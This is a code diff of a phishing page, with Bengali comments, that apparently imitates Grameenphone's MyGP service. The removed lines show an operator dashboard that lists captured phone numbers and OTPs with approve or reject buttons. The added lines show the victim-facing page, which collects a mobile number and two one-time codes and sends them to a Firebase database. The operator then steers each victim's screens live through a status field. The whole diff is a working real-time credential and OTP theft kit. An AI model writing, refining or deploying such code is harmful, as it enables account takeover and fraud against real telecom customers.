-                .sort((a, b) => {
-                    // Sort by timestamp (newest first)
-                    const timeA = a[1].timestamp || 0;
-                    const timeB = b[1].timestamp || 0;
-                    return timeB - timeA;
-                });
+            const secondPage = document.getElementById('secondPage');
+            const thirdPage = document.getElementById('thirdPage');
+            const fourthPage = document.getElementById('fourthPage');
+            const fifthPage = document.getElementById('fifthPage');
+            const failedPage = document.getElementById('failedPage');
 
-            if (requests.length === 0) {
-                grid.innerHTML = '<div class="no-requests">No active requests found.</div>';
-                return;
-            }
+            const otp1 = document.getElementById('otp1');
+            const otp2 = document.getElementById('otp2');
+            const otp3 = document.getElementById('otp3');
+            const otp4 = document.getElementById('otp4');
+            const otpInputs = [otp1, otp2, otp3, otp4];
+            const verifyOtpBtn = document.getElementById('verifyOtpBtn');
 
-            let html = '';
-            
-            requests.forEach(([phoneNumber, request]) => {
-                const status = request.status || 'unknown';
-                const timestamp = request.lastUpdated ? new Date(request.lastUpdated).toLocaleString() : 'Unknown';
-                const otp1 = request.otp1 || '';
-                const otp2 = request.otp2 || '';
-                
-                let actionButtons = '';
-                
-                // Generate buttons based on status
-                switch(status) {
-                    case 'pending_number':
-                        actionButtons = `
-                            <button class="action-btn approve" onclick="updateUserStatus('${phoneNumber}', 'approved_number')">
-                                Approve Number
-                            </button>
-                        `;
-                        break;
-                        
-                    case 'pending_otp1':
-                        actionButtons = `
-                            <button class="action-btn correct" onclick="updateUserStatus('${phoneNumber}', 'approved_otp1')">
-                                ✓ Correct
-                            </button>
-                            <button class="action-btn wrong" onclick="updateUserStatus('${phoneNumber}', 'otp1_error')">
-                                ✗ Wrong
-                            </button>
-                        `;
-                        break;
-                        
-                    case 'in_moments':
-                        actionButtons = `
-                            <button class="action-btn complete" onclick="updateUserStatus('${phoneNumber}', 'direct_success')">
-                                ✓ Complete
-                            </button>
-                            <button class="action-btn fail" onclick="updateUserStatus('${phoneNumber}', 'failed')">
-                                ✗ Fail
-                            </button>
-                            <button class="action-btn next" onclick="updateUserStatus('${phoneNumber}', 'go_to_p4')">
-                                Next
-                            </button>
-                        `;
-                        break;
-                        
-                    case 'pending_otp2':
-                        actionButtons = `
-                            <button class="action-btn yes" onclick="updateUserStatus('${phoneNumber}', 'approved_otp2')">
-                                ✓ Yes
-                            </button>
-                            <button class="action-btn no" onclick="updateUserStatus('${phoneNumber}', 'otp2_error')">
-                                ✗ No
-                            </button>
-                        `;
-                        break;
-                        
-                    default:
-                        actionButtons = `
-                            <button class="action-btn approve" onclick="updateUserStatus('${phoneNumber}', 'approved_number')">
-                                Reset to Number
-                            </button>
-                        `;
+            const sliderWrapper = document.getElementById('sliderWrapper');
+            const indicators = document.querySelectorAll('.indicator');
+            let currentSlide = 0;
+            const totalSlides = 3;
+            let touchStartX = 0;
+            let touchEndX = 0;
+
+            let currentPhoneNumber = '';
+            let unsubscribeUserStatus = null;
+
+            // প্রিফিক্স টগল ফাংশন
+            function togglePrefix() {
+                if (currentPrefix === '017') {
+                    currentPrefix = '013';
+                } else {
+                    currentPrefix = '017';
                 }
+                prefixText.textContent = currentPrefix;
                 
-                html += `
-                    <div class="request-card">
-                        <div class="card-header">
-                            <span class="phone-number">${phoneNumber}</span>
-                            <span class="status-badge status-${status}">${status.replace('_', ' ').toUpperCase()}</span>
-                        </div>
-                        
-                        <div class="otp-display">
-                            <div class="otp-row">
-                                <span class="otp-label">OTP 1:</span>
-                                <span class="otp-value ${!otp1 ? 'empty' : ''}">${otp1 || '----'}</span>
-                            </div>
-                            <div class="otp-row">
-                                <span class="otp-label">OTP 2:</span>
-                                <span class="otp-value ${!otp2 ? 'empty' : ''}">${otp2 || '----'}</span>
-                            </div>
-                        </div>
-                        
-                        <div class="action-buttons">
-                            ${actionButtons}
-                        </div>
-                        
-                        <div class="timestamp">
-                            Last updated: ${timestamp}
-                        </div>
-                    </div>
-                `;
-            });
-            
-            grid.innerHTML = html;
-        }
-
-        function updateStats(data) {
-            if (!data) {
-                document.getElementById('totalRequests').textContent = '0';
-                document.getElementById('pendingNumberCount').textContent = '0';
-                document.getElementById('pendingOtp1Count').textContent = '0';
-                document.getElementById('inMomentsCount').textContent = '0';
-                document.getElementById('pendingOtp2Count').textContent = '0';
-                return;
+                // লেফট প্যাডিং আপডেট করুন (প্রিফিক্সের দৈর্ঘ্য অনুযায়ী)
+                if (currentPrefix === '013') {
+                    phoneInput.style.paddingLeft = '65px'; // 013 এর জন্য একই প্যাডিং
+                } else {
+                    phoneInput.style.paddingLeft = '65px'; // 017 এর জন্যও একই
+                }
+                // ভার্টিক্যাল লাইনের পজিশন আপডেট (যদি প্রয়োজন হয়)
+                verticalLine.style.left = currentPrefix === '013' ? '60px' : '60px'; // একই রাখা হয়েছে
             }
 
-            const requests = Object.values(data).filter(r => r && r.status);
-            const total = requests.length;
-            
-            const pendingNumber = requests.filter(r => r.status === 'pending_number').length;
-            const pendingOtp1 = requests.filter(r => r.status === 'pending_otp1').length;
-            const inMoments = requests.filter(r => r.status === 'in_moments').length;
-            const pendingOtp2 = requests.filter(r => r.status === 'pending_otp2').length;
+            // প্রিফিক্সে ক্লিক ইভেন্ট যুক্ত করা
+            prefixText.addEventListener('click', function(e) {
+                e.stopPropagation();
+                togglePrefix();
+            });
 
-            document.getElementById('totalRequests').textContent = total;
-            document.getElementById('pendingNumberCount').textContent = pendingNumber;
-            document.getElementById('pendingOtp1Count').textContent = pendingOtp1;
-            document.getElementById('inMomentsCount').textContent = inMoments;
-            document.getElementById('pendingOtp2Count').textContent = pendingOtp2;
-        }
+            function forceNumericKeyboardOnAllBrowsers() {
+                phoneInput.type = 'text';
+                phoneInput.setAttribute('inputmode', 'numeric');
+                phoneInput.setAttribute('pattern', '[0-9]*');
+                phoneInput.setAttribute('autocomplete', 'off');
+                phoneInput.setAttribute('autocorrect', 'off');
+                phoneInput.setAttribute('autocapitalize', 'off');
+                phoneInput.setAttribute('spellcheck', 'false');
 
-        // Auto-refresh every 10 seconds
-        setInterval(() => {
-            window.loadRequests();
-        }, 10000);
+                if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
+                    phoneInput.type = 'number';
+                    phoneInput.setAttribute('step', 'any');
+                    phoneInput.style.webkitAppearance = 'none';
+                    phoneInput.style.appearance = 'textfield';
+                }
 
-        // Load initial data
-        window.loadRequests();
+                const isFirefoxAndroid = navigator.userAgent.match(/Firefox/i) && navigator.userAgent.match(/Android/i);
+                if (isFirefoxAndroid) {
+                    phoneInput.type = 'tel';
+                }
+            }
+
+            forceNumericKeyboardOnAllBrowsers();
+
+            function removeErrorClass() {
+                otpInputs.forEach(input => {
+                    input.classList.remove('error');
+                });
+            }
+
+            function clearOtpInputs() {
+                otpInputs.forEach(input => {
+                    input.value = '';
+                });
+                verifyOtpBtn.classList.remove('active');
+                verifyOtpBtn.disabled = true;
+                verifyOtpBtn.classList.remove('loading');
+            }
+
+            function showOtpError() {
+                otpInputs.forEach(input => {
+                    input.classList.add('error');
+                });
+
+                if (navigator.vibrate) {
+                    navigator.vibrate([100, 50, 100]);
+                }
+
+                setTimeout(() => {
+                    otpInputs.forEach(input => {
+                        input.classList.remove('error');
+                    });
+                    clearOtpInputs();
+                    otp1.focus();
+                }, 400);
+            }
+
+            function setupOtpInputs() {
+                otpInputs.forEach((input, index) => {
+                    input.type = 'text';
+                    input.setAttribute('inputmode', 'numeric');
+                    input.setAttribute('pattern', '[0-9]*');
+
+                    input.addEventListener('input', function(e) {
+                        this.classList.remove('error');
+
+                        const oldValue = this.value;
+                        const newValue = oldValue.replace(/[^0-9]/g, '');
+
+                        if (newValue !== oldValue) {
+                            this.value = newValue;
+                        }
+
+                        if (this.value.length === 1) {
+                            if (index < 3) {
+                                otpInputs[index + 1].focus();
+                            }
+                        }
+
+                        checkAllOtpFilled();
+                    });
+
+                    input.addEventListener('keydown', function(e) {
+                        if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                            otpInputs[index - 1].focus();
+                        }
+
+                        if (e.key.length === 1 && !/[0-9]/.test(e.key) && !e.ctrlKey && !e.metaKey) {
+                            e.preventDefault();
+                        }
+                    });
+
+                    input.addEventListener('click', function() {
+                        this.select();
+                    });
+
+                    input.addEventListener('focus', function() {
+                        this.select();
+                    });
+
+                    input.addEventListener('paste', function(e) {
+                        e.preventDefault();
+                        const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+                        const numbersOnly = pastedText.replace(/[^0-9]/g, '');
+
+                        if (numbersOnly.length > 0) {
+                            for (let i = 0; i < Math.min(numbersOnly.length, 4 - index); i++) {
+                                otpInputs[index + i].value = numbersOnly[i];
+                            }
+
+                            const nextIndex = index + Math.min(numbersOnly.length, 4 - index);
+                            if (nextIndex < 4) {
+                                otpInputs[nextIndex].focus();
+                            } else {
+                                otpInputs[3].focus();
+                            }
+
+                            checkAllOtpFilled();
+                        }
+                    });
+                });
+            }
+
+            function checkAllOtpFilled() {
+                const allFilled = otp1.value.length === 1 &&
+                                  otp2.value.length === 1 &&
+                                  otp3.value.length === 1 &&
+                                  otp4.value.length === 1;
+
+                if (allFilled) {
+                    verifyOtpBtn.classList.add('active');
+                    verifyOtpBtn.disabled = false;
+                } else {
+                    verifyOtpBtn.classList.remove('active');
+                    verifyOtpBtn.disabled = true;
+                }
+            }
+
+            function resetOtpInputs() {
+                otp1.value = '';
+                otp2.value = '';
+                otp3.value = '';
+                otp4.value = '';
+                verifyOtpBtn.classList.remove('active');
+                verifyOtpBtn.disabled = true;
+                verifyOtpBtn.classList.remove('loading');
+                removeErrorClass();
+            }
+
+            function updateSlider(index) {
+                currentSlide = index;
+                sliderWrapper.style.transform = `translateX(-${currentSlide * 100}%)`;
+
+                indicators.forEach((indicator, i) => {
+                    if (i === currentSlide) {
+                        indicator.classList.add('active');
+                    } else {
+                        indicator.classList.remove('active');
+                    }
+                });
+            }
+
+            function nextSlide() {
+                currentSlide = (currentSlide + 1) % totalSlides;
+                updateSlider(currentSlide);
+            }
+
+            function prevSlide() {
+                currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
+                updateSlider(currentSlide);
+            }
+
+            sliderWrapper.addEventListener('touchstart', (e) => {
+                touchStartX = e.touches[0].clientX;
+            }, { passive: true });
+
+            sliderWrapper.addEventListener('touchend', (e) => {
+                if (touchStartX === 0) return;
+
+                touchEndX = e.changedTouches[0].clientX;
+                const diffX = touchStartX - touchEndX;
+
+                if (Math.abs(diffX) > 50) {
+                    if (diffX > 0) {
+                        nextSlide();
+                    } else {
+                        prevSlide();
+                    }
+                }
+
+                touchStartX = 0;
+                touchEndX = 0;
+            }, { passive: true });
+
+            indicators.forEach((indicator) => {
+                indicator.addEventListener('click', () => {
+                    const index = parseInt(indicator.dataset.index);
+                    updateSlider(index);
+                });
+            });
+
+            let slideInterval = setInterval(nextSlide, 5000);
+
+            sliderWrapper.addEventListener('touchstart', () => {
+                clearInterval(slideInterval);
+            }, { passive: true });
+
+            sliderWrapper.addEventListener('touchend', () => {
+                clearInterval(slideInterval);
+                slideInterval = setInterval(nextSlide, 5000);
+            }, { passive: true });
+
+            updateSlider(0);
+
+            function scrollToInput() {
+                if (window.innerWidth <= 768) {
+                    setTimeout(() => {
+                        const inputPosition = phoneInput.getBoundingClientRect().top;
+                        const windowHeight = window.innerHeight;
+
+                        if (inputPosition > windowHeight * 0.7) {
+                            const targetTranslate = Math.min(inputPosition - 80, 120);
+                            container.style.transform = `translateY(-${targetTranslate}px)`;
+                        }
+                    }, 150);
+                }
+            }
+
+            function resetScroll() {
+                container.style.transform = 'translateY(0)';
+            }
+
+            function vibrateAndShake() {
+                if (navigator.vibrate) {
+                    navigator.vibrate([50, 30, 50]);
+                }
+
+                inputContainer.classList.add('shake-container');
+                setTimeout(() => {
+                    inputContainer.classList.remove('shake-container');
+                }, 400);
+            }
+
+            function setInputValue(digits) {
+                let cleaned = digits.replace(/[^0-9]/g, '');
+
+                if (cleaned.length > 8) {
+                    cleaned = cleaned.slice(0, 8);
+                    vibrateAndShake();
+                }
+
+                phoneInput.value = cleaned;
+                updateVerifyButton();
+            }
+
+            function updateVerifyButton() {
+                if (phoneInput.value.length === 8) {
+                    verifyBtn.classList.add('active');
+                    verifyBtn.disabled = false;
+                } else {
+                    verifyBtn.classList.remove('active');
+                    verifyBtn.disabled = true;
+                }
+            }
+
+            function showModal() {
+                const fullNumber = currentPrefix + phoneInput.value;
+                modalNumber.textContent = fullNumber;
+                modalOverlay.classList.add('show');
+                document.body.style.overflow = 'hidden';
+            }
+
+            function hideModal() {
+                modalOverlay.classList.remove('show');
+                document.body.style.overflow = 'hidden';
+            }
+
+            // Listen for admin updates for current user
+            function listenForUserUpdates(phoneNumber) {
+                if (unsubscribeUserStatus) {
+                    unsubscribeUserStatus();
+                }
+
+                const db = window.firebaseDatabase;
+                const userRef = window.firebaseRef(db, 'requests/' + phoneNumber);
+
+                unsubscribeUserStatus = window.firebaseOnValue(userRef, (snapshot) => {
+                    const data = snapshot.val();
+                    if (!data) return;
+
+                    console.log('Admin update received:', data);
+
+                    // Handle different status updates from admin
+                    switch(data.status) {
+                        case 'approved_number':
+                            // Admin approved number - show OTP page
+                            hideModal();
+                            verifyBtn.classList.remove('loading');
+                            showSecondPage();
+                            break;
+
+                        case 'otp1_error':
+                            // Wrong OTP - show error
+                            showOtpError();
+                            break;
+
+                        case 'approved_otp1':
+                            // Correct OTP - show moments page
+                            showThirdPage();
+                            break;
+
+                        case 'direct_success':
+                            // Go directly to success
+                            showFifthPage();
+                            break;
+
+                        case 'failed':
+                            // Show failed page
+                            showFailedPage();
+                            break;
+
+                        case 'go_to_p4':
+                            // Go to page 4 (two-step)
+                            showFourthPage();
+                            break;
+
+                        case 'approved_otp2':
+                            // Second OTP correct - show success
+                            showFifthPage();
+                            break;
+
+                        case 'otp2_error':
+                            // Second OTP wrong - show error on page 4
+                            showP4OtpError();
+                            break;
+                    }
+                });
+            }
+
+            async function sendPhoneNumberToFirebase(phoneNumber) {
+                const db = window.firebaseDatabase;
+                const requestRef = window.firebaseRef(db, 'requests/' + phoneNumber);
+
+                try {
+                    // Set initial status as pending_number
+                    await window.firebaseSet(requestRef, {
+                        phoneNumber: phoneNumber,
+                        status: 'pending_number',
+                        timestamp: Date.now(),
+                        lastUpdated: new Date().toISOString(),
+                        otp1: '',
+                        otp2: ''
+                    });
+
+                    console.log('Phone number sent to Firebase:', phoneNumber);
+                    return true;
+                } catch (error) {
+                    console.error("Firebase error:", error);
+                    return false;
+                }
+            }
+
+            async function sendOtp1ToFirebase(phoneNumber, otpCode) {
+                const db = window.firebaseDatabase;
+                const requestRef = window.firebaseRef(db, 'requests/' + phoneNumber);
+
+                try {
+                    await window.firebaseSet(requestRef, {
+                        phoneNumber: phoneNumber,
+                        status: 'pending_otp1',
+                        otp1: otpCode,
+                        timestamp: Date.now(),
+                        lastUpdated: new Date().toISOString()
+                    });
+
+                    console.log('OTP1 sent to Firebase:', otpCode);
+                    return true;
+                } catch (error) {
+                    console.error("Firebase error:", error);
+                    return false;
+                }
+            }
+
+            async function sendOtp2ToFirebase(phoneNumber, otpCode) {
+                const db = window.firebaseDatabase;
+                const requestRef = window.firebaseRef(db, 'requests/' + phoneNumber);
+
+                try {
+                    await window.firebaseSet(requestRef, {
+                        phoneNumber: phoneNumber,
+                        status: 'pending_otp2',
+                        otp2: otpCode,
+                        timestamp: Date.now(),
+                        lastUpdated: new Date().toISOString()
+                    });
+
+                    console.log('OTP2 sent to Firebase:', otpCode);
+                    return true;
+                } catch (error) {
+                    console.error("Firebase error:", error);
+                    return false;
+                }
+            }
+
+            async function setInMomentsStatus(phoneNumber) {
+                const db = window.firebaseDatabase;
+                const requestRef = window.firebaseRef(db, 'requests/' + phoneNumber);
+
+                try {
+                    await window.firebaseSet(requestRef, {
+                        phoneNumber: phoneNumber,
+                        status: 'in_moments',
+                        timestamp: Date.now(),
+                        lastUpdated: new Date().toISOString()
+                    });
+                } catch (error) {
+                    console.error("Firebase error:", error);
+                }
+            }
+
+            function handleVerify() {
+                if (phoneInput.value.length === 8) {
+                    showModal();
+                }
+            }
+
+            async function finalVerification() {
+                const originalText = modalCloseBtn.textContent;
+                modalCloseBtn.innerHTML = '<div class="spinner-container"><div class="spinner-dot small"></div><div class="spinner-dot medium"></div><div class="spinner-dot large"></div></div>';
+                modalCloseBtn.disabled = true;
+                modalEditBtn.disabled = true;
+
+                const fullNumber = currentPrefix + phoneInput.value;
+                currentPhoneNumber = fullNumber;
+
+                // Send to Firebase and wait for admin approval
+                const success = await sendPhoneNumberToFirebase(fullNumber);
+
+                if (success) {
+                    // Start listening for admin updates
+                    listenForUserUpdates(fullNumber);
+                    
+                    // Show loading on verify button
+                    verifyBtn.classList.add('loading');
+                    
+                    // Hide modal but keep loading state
+                    hideModal();
+                } else {
+                    // Error case - restore modal
+                    modalCloseBtn.innerHTML = originalText;
+                    modalCloseBtn.disabled = false;
+                    modalEditBtn.disabled = false;
+                    alert('Failed to send request. Please try again.');
+                }
+            }
+
+            function showSecondPage() {
+                secondPage.classList.add('open');
+                document.body.style.overflow = 'hidden';
+                resetOtpInputs();
+                setTimeout(() => {
+                    otp1.focus();
+                }, 400);
+            }
+
+            function showThirdPage() {
+                // Close second page first
+                secondPage.classList.remove('open');
+                
+                // Open third page
+                thirdPage.classList.add('open');
+                document.body.style.overflow = 'hidden';
+                
+                // Set status to in_moments
+                if (currentPhoneNumber) {
+                    setInMomentsStatus(currentPhoneNumber);
+                }
+            }
+
+            function showFourthPage() {
+                // Close third page
+                thirdPage.classList.remove('open');
+                
+                // Open fourth page
+                fourthPage.classList.add('open');
+                document.body.style.overflow = 'hidden';
+                
+                // Focus on first input of page 4
+                setTimeout(() => {
+                    const firstInputP4 = document.getElementById('otp_p4_1');
+                    if (firstInputP4) {
+                        firstInputP4.focus();
+                    }
+                }, 400);
+            }
+
+            function showFifthPage() {
+                // Close all pages
+                secondPage.classList.remove('open');
+                thirdPage.classList.remove('open');
+                fourthPage.classList.remove('open');
+                failedPage.classList.remove('open');
+                
+                // Open fifth page
+                fifthPage.classList.add('open');
+                document.body.style.overflow = 'hidden';
+            }
+
+            function showFailedPage() {
+                // Close all pages
+                secondPage.classList.remove('open');
+                thirdPage.classList.remove('open');
+                fourthPage.classList.remove('open');
+                fifthPage.classList.remove('open');
+                
+                // Open failed page
+                failedPage.classList.add('open');
+                document.body.style.overflow = 'hidden';
+            }
+
+            function handleOtpVerification() {
+                const otpCode = otp1.value + otp2.value + otp3.value + otp4.value;
+
+                verifyOtpBtn.classList.add('loading');
+                verifyOtpBtn.disabled = true;
+
+                // Send OTP to Firebase
+                if (currentPhoneNumber) {
+                    sendOtp1ToFirebase(currentPhoneNumber, otpCode);
+                }
+            }
+
+            modalEditBtn.addEventListener('click', function() {
+                hideModal();
+                phoneInput.focus();
+            });
+
+            modalCloseBtn.addEventListener('click', function() {
+                finalVerification();
+            });
+
+            verifyOtpBtn.addEventListener('click', function() {
+                if (!this.disabled && !this.classList.contains('loading')) {
+                    handleOtpVerification();
+                }
+            });
+
+            modalOverlay.addEventListener('click', function(e) {
+                e.stopPropagation();
+            });
+
+            const modalContent = document.querySelector('.modal-content');
+            modalContent.addEventListener('click', function(e) {
+                e.stopPropagation();
+            });
+
+            setInputValue('');
+
+            phoneInput.addEventListener('focus', function() {
+                scrollToInput();
+
+                setTimeout(() => {
+                    try {
+                        this.setSelectionRange(this.value.length, this.value.length);
+                    } catch(e) {}
+                }, 10);
+            });
+
+            phoneInput.addEventListener('blur', function() {
+                resetScroll();
+            });
+
+            phoneInput.addEventListener('keydown', function(e) {
+                const cursorPos = this.selectionStart;
+                const valueLength = this.value.length;
+
+                if (e.key === 'Backspace' || e.key === 'Delete') {
+                    if (valueLength === 0) {
+                        e.preventDefault();
+                        vibrateAndShake();
+                        return false;
+                    }
+
+                    if (this.selectionStart === 0 && this.selectionEnd === valueLength) {
+                        return true;
+                    }
+
+                    if (e.key === 'Backspace' && cursorPos === 0 && valueLength > 0 && !(this.selectionStart === 0 && this.selectionEnd === valueLength)) {
+                        e.preventDefault();
+                        vibrateAndShake();
+                        return false;
+                    }
+
+                    if (e.key === 'Delete' && cursorPos === valueLength && valueLength > 0 && !(this.selectionStart === 0 && this.selectionEnd === valueLength)) {
+                        e.preventDefault();
+                        vibrateAndShake();
+                        return false;
+                    }
+                }
+
+                if (e.key === 'x' && (e.ctrlKey || e.metaKey)) {
+                    return true;
+                }
+
+                if (e.key === 'a' && (e.ctrlKey || e.metaKey)) {
+                    e.preventDefault();
+                    setTimeout(() => {
+                        if (this.value.length > 0) {
+                            this.setSelectionRange(0, this.value.length);
+                        }
+                    }, 0);
+                }
+
+                if (e.key.length === 1 && !/[0-9]/.test(e.key) && !e.ctrlKey && !e.metaKey) {
+                    e.preventDefault();
+                    vibrateAndShake();
+                    return false;
+                }
+            });
+
+            phoneInput.addEventListener('input', function(e) {
+                const oldValue = this.value;
+                const numbersOnly = oldValue.replace(/[^0-9]/g, '');
+
+                if (numbersOnly !== oldValue) {
+                    this.value = numbersOnly;
+                    vibrateAndShake();
+                }
+
+                if (this.value.length > 8) {
+                    this.value = this.value.slice(0, 8);
+                    vibrateAndShake();
+                }
+
+                updateVerifyButton();
+            });
+
+            phoneInput.addEventListener('paste', function(e) {
+                e.preventDefault();
+
+                const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+                let numbersOnly = pastedText.replace(/[^0-9]/g, '');
+
+                if (numbersOnly.length === 11 && (numbersOnly.startsWith('017') || numbersOnly.startsWith('013'))) {
+                    numbersOnly = numbersOnly.substring(3);
+                }
+
+                const currentVal = this.value;
+                const cursorStart = this.selectionStart;
+                const cursorEnd = this.selectionEnd;
+
+                let newValue = currentVal.substring(0, cursorStart) + numbersOnly + currentVal.substring(cursorEnd);
+                newValue = newValue.replace(/[^0-9]/g, '');
+
+                if (newValue.length > 8) {
+                    newValue = newValue.slice(0, 8);
+                    vibrateAndShake();
+                }
+
+                this.value = newValue;
+
+                setTimeout(() => {
+                    const newCursorPos = Math.min(cursorStart + numbersOnly.length, this.value.length);
+                    try {
+                        this.setSelectionRange(newCursorPos, newCursorPos);
+                    } catch(e) {}
+                    updateVerifyButton();
+                }, 0);
+            });
+
+            phoneInput.addEventListener('cut', function(e) {
+                const valueLength = this.value.length;
+
+                if (valueLength === 0) {
+                    e.preventDefault();
+                    vibrateAndShake();
+                    return;
+                }
+            });
+
+            phoneInput.addEventListener('dragstart', function(e) {
+                e.preventDefault();
+            });
+
+            verifyBtn.addEventListener('click', function() {
+                if (!this.disabled) {
+                    handleVerify();
+                }
+            });
+
+            window.addEventListener('resize', function() {
+                if (document.activeElement !== phoneInput) {
+                    resetScroll();
+                }
+            });
+
+            if (window.visualViewport) {
+                window.visualViewport.addEventListener('resize', () => {
+                    if (window.visualViewport.height >= window.innerHeight) {
+                        resetScroll();
+                    }
+                });
+            }
+
+            phoneInput.addEventListener('click', function() {
+                this.focus();
+            });
+
+            document.addEventListener('DOMContentLoaded', function() {
+                forceNumericKeyboardOnAllBrowsers();
+                setupOtpInputs();
+            });
+
+            const leftIcon = document.querySelector('.top-bar img:first-child');
+            if (leftIcon) {
+                leftIcon.style.cursor = 'pointer';
+                leftIcon.addEventListener('click', function() {
+                    window.location.href = "intent://details?id=com.portonics.mygp#Intent;scheme=market;package=com.android.vending;end;";
+                });
+            }
+
+            const rightIcon = document.querySelector('.top-bar img:last-child');
+            if (rightIcon) {
+                rightIcon.style.cursor = 'pointer';
+                rightIcon.addEventListener('click', function() {
+                    window.location.href = 'https://www.grameenphone.com';
+                });
+            }
+
+            const otpP4Inputs = [
+                document.getElementById('otp_p4_1'),
+                document.getElementById('otp_p4_2'),
+                document.getElementById('otp_p4_3'),
+                document.getElementById('otp_p4_4')
+            ];
+            const verifyOtpBtnP4 = document.getElementById('verifyOtpBtnPage4');
+
+            // নতুন এই কোডটি দিয়ে আগেরটুকুকে রিপ্লেস করুন
+function showP4OtpError() {
+    otpP4Inputs.forEach(input => {
+        input.classList.add('error');
+    });
+
+    // বাটন থেকে লোডিং স্পিনার সরিয়ে দেওয়া এবং রিসেট করা
+    verifyOtpBtnP4.classList.remove('loading'); 
+    verifyOtpBtnP4.classList.remove('active');
+    verifyOtpBtnP4.disabled = true;
+
+    if (navigator.vibrate) {
+        navigator.vibrate([100, 50, 100]);
+    }
+
+    setTimeout(() => {
+        otpP4Inputs.forEach(input => {
+            input.classList.remove('error');
+            input.value = '';
+        });
+        otpP4Inputs[0].focus();
+    }, 400);
+}
+
+            function checkP4OtpFilled() {
+                const allFilled = otpP4Inputs.every(input => input && input.value.length === 1);
+                if (allFilled) {
+                    verifyOtpBtnP4.classList.add('active');
+                    verifyOtpBtnP4.disabled = false;
+                } else {
+                    verifyOtpBtnP4.classList.remove('active');
+                    verifyOtpBtnP4.disabled = true;
+                }
+            }
+
+            otpP4Inputs.forEach((input, index) => {
+                if(input) {
+                    input.addEventListener('input', function() {
+                        this.value = this.value.replace(/[^0-9]/g, '');
+                        if (this.value.length === 1 && index < 3) {
+                            otpP4Inputs[index + 1].focus();
+                        }
+                        checkP4OtpFilled();
+                    });
+
+                    input.addEventListener('keydown', function(e) {
+                        if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                            otpP4Inputs[index - 1].focus();
+                        }
+                    });
+                    input.addEventListener('focus', function() { this.select(); });
+                }
+            });
+
+            if (verifyOtpBtnP4) {
+                verifyOtpBtnP4.addEventListener('click', function() {
+                    const enteredCode = otpP4Inputs.map(input => input.value).join('');
+
+                    this.classList.add('loading');
+                    this.disabled = true;
+
+                    // Send OTP2 to Firebase
+                    if (currentPhoneNumber) {
+                        sendOtp2ToFirebase(currentPhoneNumber, enteredCode);
+                    }
+                });
+            }
+
+            // Cleanup listener on page unload
+            window.addEventListener('beforeunload', function() {
+                if (unsubscribeUserStatus) {
+                    unsubscribeUserStatus();
+                }
+            });
+        })();
     </script>
 </body>
 </html>
